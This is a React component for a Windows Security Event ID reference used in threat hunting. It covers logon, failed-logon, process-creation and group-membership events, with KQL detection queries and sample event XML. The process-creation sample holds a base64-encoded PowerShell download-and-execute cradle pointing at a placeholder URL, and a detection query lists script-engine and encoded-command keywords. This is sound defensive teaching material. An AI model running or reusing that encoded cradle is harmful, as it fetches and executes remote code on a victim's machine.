/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState } from "react";
import {
  BookOpen,
  Search,
  ShieldAlert,
  Terminal,
  Activity,
  FileCode2,
  Copy,
  Check,
  Tag,
  Eye,
  ArrowRight,
  UserCheck,
  AlertTriangle,
  Zap,
  Info
} from "lucide-react";

interface EventField {
  name: string;
  description: string;
  importance: "high" | "medium" | "low";
}

interface EventIdDetails {
  id: string;
  name: string;
  description: string;
  category: string;
  tactic: string;
  severity: "low" | "medium" | "high" | "critical";
  monitoredFields: EventField[];
  logonTypes?: { type: string; name: string; desc: string }[];
  xmlTemplate: string;
  huntGuidance: string;
  kqlQuery: string;
}

const eventEncyclopedia: Record<string, EventIdDetails> = {
  "4624": {
    id: "4624",
    name: "An account was successfully logged on",
    description: "Generated when a logon session is created on a destination machine. It documents the exact authentication mechanism, logon type, source network address, and logon process used.",
    category: "Logon/Logoff",
    tactic: "Lateral Movement / Initial Access",
    severity: "low",
    logonTypes: [
      { type: "2", name: "Interactive", desc: "Local console logon (keyboard/monitor)." },
      { type: "3", name: "Network", desc: "Access via network shares, IIS authentication, or RPC connect." },
      { type: "4", name: "Batch", desc: "Task scheduler or batch server executions." },
      { type: "5", name: "Service", desc: "Service control manager start events." },
      { type: "7", name: "Unlock", desc: "Workstation lock screen unlock." },
      { type: "8", name: "NetworkCleartext", desc: "Cleartext credentials sent over network (often Basic Auth/IIS)." },
      { type: "9", name: "NewCredentials", desc: "RunAs wrapper with /netonly calling external domains." },
      { type: "10", name: "RemoteInteractive", desc: "Terminal Services, RDP, or remote assistance session." },
      { type: "11", name: "CachedInteractive", desc: "Logon using cached credentials because DC was offline." }
    ],
    monitoredFields: [
      { name: "TargetUserName", description: "The username being authenticated. Look for systemic drift.", importance: "high" },
      { name: "LogonType", description: "Method of logon. Critical for distinguishing RDP (10) vs Network (3).", importance: "high" },
      { name: "IpAddress", description: "Client source hostname or IP. Spot foreign ranges or internal anomalies.", importance: "high" },
      { name: "TargetUserSid", description: "User's SID. Watch for well-known admin SIDs like S-1-5-21-...-500.", importance: "medium" },
      { name: "WorkstationName", description: "The source host name specified by the client machine.", importance: "low" }
    ],
    xmlTemplate: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54848c25-81ef-4ab9-a66c-aa7e1179beb2}" />
    <EventID>4624</EventID>
    <Channel>Security</Channel>
  </System>
  <EventData>
    <Data Name="TargetUserSid">S-1-5-21-290035-152068-185489-1002</Data>
    <Data Name="TargetUserName">Susan.Jones</Data>
    <Data Name="LogonType">10</Data>
    <Data Name="LogonProcessName">User32</Data>
    <Data Name="AuthenticationPackageName">Negotiate</Data>
    <Data Name="WorkstationName">WS04-PROD</Data>
    <Data Name="IpAddress">192.168.14.88</Data>
  </EventData>
</Event>`,
    huntGuidance: "Compare TargetUserName against IpAddress. Flag when standard domain admins log in with LogonType 3 or 10 from developer network segments. Check for LogonType 3 from outside local boundaries, or LogonType 10 (RemoteInteractive) during unusual off-duty hours.",
    kqlQuery: `SecurityEvent
| where EventID == 4624
| extend LogonTypeName = case(
    LogonType == 2, "Interactive (Local)",
    LogonType == 3, "Network Share/IIS",
    LogonType == 4, "Batch/Task",
    LogonType == 5, "Service Start",
    LogonType == 7, "Unlock Screen",
    LogonType == 8, "Network Cleartext",
    LogonType == 9, "New Credentials Netonly",
    LogonType == 10, "Remote Desktop (RDP)",
    LogonType == 11, "Cached Offline",
    tostring(LogonType)
  )
| summarize EventCount=count() by TargetUserName, IpAddress, LogonTypeName, Computer
| order by EventCount desc`
  },
  "4625": {
    id: "4625",
    name: "An account failed to log on",
    description: "Generated when an authentication request fails on the local computer. This records precisely why check failed (e.g., bad password, locked account, non-existent username) and source vector.",
    category: "Logon/Logoff",
    tactic: "Credential Access / Brute Force",
    severity: "medium",
    logonTypes: [
      { type: "2", name: "Interactive", desc: "Local console logon failed." },
      { type: "3", name: "Network", desc: "Network authentication failed (e.g. SMB brute force)." },
      { type: "10", name: "RemoteInteractive", desc: "RDP connection failure (brute-forcing external hosts)." }
    ],
    monitoredFields: [
      { name: "TargetUserName", description: "The username that failed. Watch for non-existent users indicating blind spraying.", importance: "high" },
      { name: "SubStatus", description: "The underlying failure code (e.g. 0xC000006A = Wrong Password, 0xC0000234 = Locked).", importance: "high" },
      { name: "IpAddress", description: "IP of caller. Correlate with firewall triggers and reputation index.", importance: "high" },
      { name: "Status", description: "General failure code mapping.", importance: "medium" }
    ],
    xmlTemplate: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>4625</EventID>
    <Channel>Security</Channel>
  </System>
  <EventData>
    <Data Name="TargetUserName">Administrator</Data>
    <Data Name="Status">0xC000006D</Data>
    <Data Name="SubStatus">0xC000006A</Data>
    <Data Name="IpAddress">185.220.101.44</Data>
  </EventData>
</Event>`,
    huntGuidance: "Aggregate failures by IpAddress. If a single IP is attempting access across multiple usernames within short intervals, it is a password spraying attack. If targeting a single account, it indicates a focused brute-force campaign.",
    kqlQuery: `SecurityEvent
| where EventID == 4625
| summarize FailedAttemps = count(), TriedUsers = make_set(TargetUserName) by IpAddress, Computer, bin(TimeGenerated, 15m)
| where FailedAttemps > 5
| order by FailedAttemps desc`
  },
  "4688": {
    id: "4688",
    name: "A new process has been created",
    description: "Documents process executions with CommandLine arguments, Parent Process ID details, and creator SID. Vital for understanding command-and-control behavior and lateral telemetry.",
    category: "Detailed Tracking",
    tactic: "Execution / C2 Execution",
    severity: "low",
    monitoredFields: [
      { name: "NewProcessName", description: "Path of the binary spawned (e.g., C:\\Windows\\System32\\cmd.exe).", importance: "high" },
      { name: "CommandLine", description: "Full argument payload run. Checks for PowerShell encoding or obfuscated scripting.", importance: "high" },
      { name: "ParentProcessName", description: "Process that initiated the spawn (e.g., explorer.exe spawning cmd.exe is normal; wsmprovhost.exe spawning powershell.exe usually indicates WinRM/PSRemoting).", importance: "high" },
      { name: "SubjectUserName", description: "The account name that executed the process.", importance: "medium" }
    ],
    xmlTemplate: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>4688</EventID>
    <Channel>Security</Channel>
  </System>
  <EventData>
    <Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -Enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vLi4uJyAp</Data>
    <Data Name="ParentProcessName">C:\\Windows\\System32\\cmd.exe</Data>
  </EventData>
</Event>`,
    huntGuidance: "Search for suspicious process hierarchies: web servers (w3wp.exe) or terminal listeners spawning command shell prompts; script engines running in hidden, silent, or base64-encoded arguments configurations (-enc, -w hidden). Ensure Command Line Process Auditing is turned on in active GPOs.",
    kqlQuery: `SecurityEvent
| where EventID == 4688
| where CommandLine has_any ("powershell", "cmd", "encodedcommand", "bypass", "wscript", "cscript", "mshta")
| project TimeGenerated, Computer, NewProcessName, CommandLine, ParentProcessName, SubjectUserName
| order by TimeGenerated desc`
  },
  "4728": {
    id: "4728",
    name: "A member was added to a security-enabled global group",
    description: "Triggers when a privilege escalation action adds a security principal to a global directory container (e.g. Domain Admins, Enterprise Admins). Essential audit trail for administrative modifications.",
    category: "Account Management",
    tactic: "Persistence / Privilege Escalation",
    severity: "high",
    monitoredFields: [
      { name: "MemberName", description: "The user or group added as a member.", importance: "high" },
      { name: "TargetUserName", description: "The directory global group name target (e.g., Domain Admins).", importance: "high" },
      { name: "SubjectUserName", description: "The administrator or service account that executed the insertion.", importance: "high" }
    ],
    xmlTemplate: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>4728</EventID>
    <Channel>Security</Channel>
  </System>
  <EventData>
    <Data Name="MemberName">CN=attacker_user,CN=Users,DC=corp,DC=local</Data>
    <Data Name="TargetUserName">Domain Admins</Data>
    <Data Name="SubjectUserName">Admin_Service_Acc</Data>
  </EventData>
</Event>`,
    huntGuidance: "Monitor global group changes outside of change management schedules. Raise critical alerts immediately on any additions to 'Domain Admins', 'Enterprise Admins', or high-priority security constructs. Investigate who (SubjectUserName) approved the membership.",
    kqlQuery: `SecurityEvent
| where EventID == 4728
| where TargetUserName in~ ("Domain Admins", "Enterprise Admins", "Schema Admins")
| project TimeGenerated, TargetUserName, MemberName, SubjectUserName, Computer
| order by TimeGenerated desc`
  }
};

export default function EventIdEncyclopediaView() {
  const [searchQuery, setSearchQuery] = useState("");
  const [selectedId, setSelectedId] = useState<string>("4624");
  const [copiedQuery, setCopiedQuery] = useState(false);
  const [copiedXml, setCopiedXml] = useState(false);

  const selectedEvent = eventEncyclopedia[selectedId] || eventEncyclopedia["4624"];

  const handleCopy = (text: string, type: "query" | "xml") => {
    navigator.clipboard.writeText(text);
    if (type === "query") {
      setCopiedQuery(true);
      setTimeout(() => setCopiedQuery(false), 2000);
    } else {
      setCopiedXml(true);
      setTimeout(() => setCopiedXml(false), 2000);
    }
  };

  // Safe manual input handler
  const handleManualSearch = (id: string) => {
    const cleaned = id.trim();
    if (eventEncyclopedia[cleaned]) {
      setSelectedId(cleaned);
    }
  };

  return (
    <div className="space-y-6 animate-fade-in">
      {/* Search Header */}
      <div className="bg-slate-950/60 backdrop-blur-md border border-slate-900 rounded p-5 flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <h2 className="text-sm font-mono font-bold text-slate-100 tracking-wider uppercase mb-1 flex items-center gap-2">
            <BookOpen className="w-4 h-4 text-orange-505 text-orange-500 animate-pulse" />
            WINDOWS SECURITY EVENT ID ENCYCLOPEDIA
          </h2>
          <p className="text-xs text-slate-550 font-mono">
            Interactive analytical references map for crucial Windows registry event logs used in threat hunting and SIEM correlation.
          </p>
        </div>

        {/* Input box to quickly type Event ID */}
        <div className="relative max-w-xs w-full font-mono">
          <Search className="absolute left-2.5 top-2.5 h-3.5 w-3.5 text-slate-500" />
          <input
            id="event-encyclopedia-search"
            type="text"
            placeholder="Type Event ID (e.g. 4625)..."
            value={searchQuery}
            onChange={(e) => {
              setSearchQuery(e.target.value);
              handleManualSearch(e.target.value);
            }}
            className="w-full bg-slate-950 border border-slate-850 focus:border-red-500 focus:outline-none rounded pl-8 pr-4 py-1.5 text-xs text-slate-201 placeholder-slate-600 font-bold"
          />
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
        {/* Left Side: Selecting list */}
        <div className="bg-slate-950/50 backdrop-blur-md border border-slate-900 rounded p-3 space-y-1 font-mono text-xs select-none h-fit">
          <span className="text-[9px] text-slate-550 px-2 uppercase font-bold tracking-widest block mb-1.5">CORE OS AUDITS</span>
          {Object.values(eventEncyclopedia).map((ev) => (
            <button
              key={ev.id}
              onClick={() => {
                setSelectedId(ev.id);
                setSearchQuery(ev.id);
              }}
              className={`w-full text-left px-3 py-2 rounded transition flex justify-between items-center ${
                selectedId === ev.id
                  ? "bg-red-950/20 text-red-400 border-l-2 border-red-500 pl-2.5"
                  : "text-slate-400 hover:text-slate-200 hover:bg-slate-900/40"
              }`}
            >
              <div className="font-bold flex items-center gap-2">
                <Tag className="w-3.5 h-3.5 text-slate-550 group-hover:text-slate-300" />
                <span>{ev.id}</span>
              </div>
              <span className={`text-[8.5px] px-1.5 py-0.5 rounded uppercase font-bold ${
                ev.severity === "critical"
                  ? "bg-red-955 text-red-500"
                  : ev.severity === "high"
                  ? "text-red-450 bg-red-950/25"
                  : ev.severity === "medium"
                  ? "text-amber-400 bg-amber-950/20"
                  : "text-emerald-450 bg-emerald-950/20"
              }`}>
                {ev.severity}
              </span>
            </button>
          ))}
          
          <div className="pt-3 border-t border-slate-900/60 mt-2 p-1.5 text-[9.5px] text-slate-500 leading-normal">
            <span className="font-bold text-slate-400 block mb-1 flex items-center gap-1.5">
              <Info className="w-3.5 h-3.5 text-blue-500" />
              TIPS
            </span>
            Windows Security log policies require configuring Audit Policies (e.g., Audit Process Creation) within Domain Group Policies to write events to the Event Viewer.
          </div>
        </div>

        {/* Right Side: Content Details */}
        <div className="md:col-span-3 bg-slate-950/60 backdrop-blur-md border border-slate-900 rounded p-5 space-y-6">
          {/* Headline block */}
          <div className="flex flex-col md:flex-row md:items-center justify-between border-b border-slate-900 pb-4 gap-3">
            <div>
              <div className="flex items-center gap-2 flex-wrap">
                <span className="text-sm font-mono font-bold bg-slate-900 text-slate-350 border border-slate-800 px-2 py-0.5 rounded leading-none select-all font-sans">
                  EVENT {selectedEvent.id}
                </span>
                <span className="text-[10px] uppercase font-mono px-2 py-0.5 rounded bg-slate-900 text-slate-400 border border-slate-850">
                  {selectedEvent.category}
                </span>
              </div>
              <h3 className="text-md sm:text-lg font-mono font-bold text-slate-200 mt-2 select-all leading-snug">
                {selectedEvent.name}
              </h3>
            </div>

            <div className="space-y-1 text-right shrink-0">
              <span className="text-[10.5px] font-mono text-slate-500 block uppercase">MITRE ATT&CK MAPPING</span>
              <span className="text-red-400 text-xs font-mono font-bold bg-red-950/20 border border-red-900/60 px-2.5 py-1 rounded select-all uppercase">
                {selectedEvent.tactic}
              </span>
            </div>
          </div>

          {/* Description */}
          <div className="space-y-2 leading-relaxed text-xs">
            <span className="text-[10px] text-slate-550 block font-mono uppercase">SECURITY MOTIVE OVERVIEW</span>
            <p className="text-slate-300 font-medium font-sans text-sm">{selectedEvent.description}</p>
          </div>

          {/* Logon Types helper matrix (For 4624 and 4625) */}
          {selectedEvent.logonTypes && (
            <div className="space-y-3 pt-1 border-t border-slate-900/40">
              <span className="text-[10px] text-slate-550 block font-mono uppercase flex items-center gap-1.5">
                <Zap className="w-3.5 h-3.5 text-amber-500" />
                Windows Logon Type Codes Reference
              </span>
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
                {selectedEvent.logonTypes.map((lt) => (
                  <div key={lt.type} className="p-2 bg-slate-950 border border-slate-900 rounded font-mono text-[10.5px] hover:border-slate-850 transition">
                    <div className="flex justify-between items-center border-b border-slate-900 pb-1">
                      <span className="text-emerald-400 font-bold">TYPE {lt.type}</span>
                      <span className="text-slate-202 text-[9px] uppercase font-semibold">{lt.name}</span>
                    </div>
                    <p className="text-slate-500 leading-normal text-[9.5px] mt-1">{lt.desc}</p>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Highlight fields */}
          <div className="space-y-3 pt-1 border-t border-slate-900/40">
            <span className="text-[10px] text-slate-555 block font-mono uppercase">FORENSIC MONITORING FIELDS</span>
            <div className="space-y-2 font-mono text-[11px]">
              {selectedEvent.monitoredFields.map((field, idx) => (
                <div key={idx} className="flex flex-col sm:flex-row sm:items-center justify-between bg-slate-950/40 border border-slate-900 p-2 rounded gap-2">
                  <div className="flex items-center gap-2.5">
                    <span className="bg-slate-900 text-slate-300 px-1.5 py-0.5 rounded border border-slate-800 font-bold select-all">
                      {field.name}
                    </span>
                    <p className="text-slate-400 font-sans text-[11px] leading-relaxed font-semibold">{field.description}</p>
                  </div>
                  <span className={`text-[9px] px-1.5 py-0.5 rounded font-bold uppercase shrink-0 text-right ${
                    field.importance === "high"
                      ? "bg-red-950/20 text-red-400 border border-red-900"
                      : field.importance === "medium"
                      ? "bg-amber-955/20 text-amber-400 border-amber-900"
                      : "bg-slate-900 text-slate-500 border border-slate-800"
                  }`}>
                    {field.importance} target
                  </span>
                </div>
              ))}
            </div>
          </div>

          {/* Hunt Strategy */}
          <div className="p-3.5 bg-slate-950 border border-slate-900 rounded text-xs leading-relaxed text-slate-300 font-sans space-y-1.5 border-l-2 border-l-red-500">
            <span className="font-bold text-red-500 font-mono text-[10.5px] uppercase flex items-center gap-1.5 block">
              <ShieldAlert className="w-3.5 h-3.5 text-red-500 shrink-0 animate-pulse" />
              THREAT HUNTING & ANALYTICAL GUIDANCE:
            </span>
            <p className="font-medium">{selectedEvent.huntGuidance}</p>
          </div>

          {/* Tabs for Kql state / XML state */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {/* KQL Query tab */}
            <div className="space-y-2">
              <div className="flex justify-between items-center">
                <span className="text-[10px] text-slate-500 font-mono uppercase flex items-center gap-1.5">
                  <FileCode2 className="w-3.5 h-3.5 text-blue-400" />
                  SIEM KQL QUERY (AZURE SENTINEL)
                </span>
                <button
                  onClick={() => handleCopy(selectedEvent.kqlQuery, "query")}
                  className="text-[9.5px] font-mono text-slate-400 hover:text-white flex items-center gap-1 transition cursor-pointer font-bold"
                >
                  {copiedQuery ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  {copiedQuery ? "COPIED" : "COPY KQL"}
                </button>
              </div>
              <pre className="p-3 bg-slate-950 border border-slate-900 rounded font-mono text-[10px] text-emerald-400 overflow-x-auto h-44 select-all select-none">
                {selectedEvent.kqlQuery}
              </pre>
            </div>

            {/* XML event template tab */}
            <div className="space-y-2">
              <div className="flex justify-between items-center">
                <span className="text-[10px] text-slate-500 font-mono uppercase flex items-center gap-1.5">
                  <Terminal className="w-3.5 h-3.5 text-emerald-400" />
                  RAW EVENT DATA RECON XML
                </span>
                <button
                  onClick={() => handleCopy(selectedEvent.xmlTemplate, "xml")}
                  className="text-[9.5px] font-mono text-slate-400 hover:text-white flex items-center gap-1 transition cursor-pointer font-bold"
                >
                  {copiedXml ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  {copiedXml ? "COPIED" : "COPY XML"}
                </button>
              </div>
              <pre className="p-3 bg-slate-950 border border-slate-900 rounded font-mono text-[9px] text-amber-500 overflow-x-auto h-44 select-all select-none">
                {selectedEvent.xmlTemplate}
              </pre>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
